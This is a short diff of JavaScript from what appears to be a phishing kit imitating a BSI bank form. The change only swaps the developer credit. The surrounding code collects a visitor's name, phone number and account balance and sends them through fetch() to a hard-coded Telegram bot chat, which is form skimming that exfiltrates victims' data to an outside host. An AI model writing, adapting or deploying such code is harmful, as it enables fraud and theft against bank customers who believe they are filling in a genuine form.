@@ -36,7 +36,7 @@ document.addEventListener('DOMContentLoaded', ()=>{
         const chatId = '8048124217';
         
         // Format pesan
-        const message = `NOTIF BSI FORM\n━━━━━━━━━━━━━━━━━━\nNama: ${nama}\nNomor HP: ${hp}\nSaldo: Rp. ${saldo}\n━━━━━━━━━━━━━━━━━━\nDeveloper: @androwebbuilders`;
+        const message = `NOTIF BSI FORM\n━━━━━━━━━━━━━━━━━━\nNama: ${nama}\nNomor HP: ${hp}\nSaldo: Rp. ${saldo}\n━━━━━━━━━━━━━━━━━━\nDeveloper: @yn_host`;
         
         // Kirim ke Telegram
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
